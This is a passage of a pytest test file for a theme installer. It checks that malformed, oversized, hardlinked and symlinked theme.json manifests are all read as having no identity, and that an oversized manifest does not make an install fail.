    "no identity" rather than raising or matching."""

    def _themes(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
        monkeypatch.setattr(tv_mod, "config_dir", lambda: tmp_path)
        return tv_mod._themes_dir()

    def test_reads_the_identity_of_an_installed_pack(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._themes(tmp_path, monkeypatch)
        _legacy_pack(tv_mod._installed_theme_dir("custom"), _LEGACY_A)
        assert th_mod._installed_theme_identity("custom") == _LEGACY_A

    def test_missing_directory_and_missing_manifest(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._themes(tmp_path, monkeypatch)
        assert th_mod._installed_theme_identity("custom") is None
        tv_mod._installed_theme_dir("custom").mkdir(parents=True)
        assert th_mod._installed_theme_identity("custom") is None

    @pytest.mark.parametrize(
        "body",
        [b"{not json", b"[]", b'"a string"', b"{}", b'{"name": 5}', b"\xff\xfe\x00"],
    )
    def test_unusable_manifest_bodies_read_as_no_identity(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, body: bytes
    ) -> None:
        self._themes(tmp_path, monkeypatch)
        d = tv_mod._installed_theme_dir("custom")
        d.mkdir(parents=True)
        (d / "theme.json").write_bytes(body)
        assert th_mod._installed_theme_identity("custom") is None

    def test_oversized_manifest_reads_as_no_identity(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # safe_read_file_bytes_nolink RAISES FileTooLargeError past the cap
        # (allow_truncate=False). Uncaught, that surfaced as HTTP 500 during
        # install; a truncated read would be a different document and must
        # never satisfy an identity comparison either.
        self._themes(tmp_path, monkeypatch)
        d = tv_mod._installed_theme_dir("custom")
        d.mkdir(parents=True)
        padding = "p" * (_THEME_FILE_CAPS["manifest"] + 1024)
        (d / "theme.json").write_text(
            json.dumps({"name": _LEGACY_A, "pad": padding}), encoding="utf-8"
        )
        assert (d / "theme.json").stat().st_size > _THEME_FILE_CAPS["manifest"]
        assert th_mod._installed_theme_identity("custom") is None

    def test_an_oversized_legacy_manifest_does_not_fail_the_install(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        themes = self._themes(tmp_path, monkeypatch)
        d = tv_mod._installed_theme_dir("custom")
        d.mkdir(parents=True)
        (d / "theme.json").write_text(
            json.dumps({"name": _LEGACY_A, "pad": "p" * (_THEME_FILE_CAPS["manifest"] + 1)}),
            encoding="utf-8",
        )
        src = _legacy_pack(tmp_path / "src" / "pack", _LEGACY_A)

        theme, err, status = th_mod._do_install("local", {"path": str(src)})

        # No 500: the oversized manifest is simply no identity, so the install
        # forks to the hashed slug and the odd directory is left alone.
        assert (status, err) == (200, None)
        assert theme is not None and theme["slug"] == _slugify_theme_name(_LEGACY_A)
        assert list(themes.glob(".install-staging-*")) == []

    def test_hardlinked_manifest_reads_as_no_identity(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # The read chokepoint refuses a hardlinked inode (st_nlink > 1) as well
        # as a symlink, so an alias pointing at content outside the theme dir
        # yields no identity. `os.link` needs no special privilege, so this
        # runs on every platform and keeps the guarantee asserted everywhere.
        self._themes(tmp_path, monkeypatch)
        d = tv_mod._installed_theme_dir("custom")
        d.mkdir(parents=True)
        outside = tmp_path / "outside.json"
        outside.write_text(json.dumps({"name": _LEGACY_A}), encoding="utf-8")
        os.link(outside, d / "theme.json")
        assert (d / "theme.json").stat().st_nlink > 1
        assert th_mod._installed_theme_identity("custom") is None

    @requires_symlinks
    def test_symlinked_manifest_reads_as_no_identity(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._themes(tmp_path, monkeypatch)
        d = tv_mod._installed_theme_dir("custom")
        d.mkdir(parents=True)
        outside = tmp_path / "outside.json"
        outside.write_text(json.dumps({"name": _LEGACY_A}), encoding="utf-8")
        (d / "theme.json").symlink_to(outside)
        assert th_mod._installed_theme_identity("custom") is None
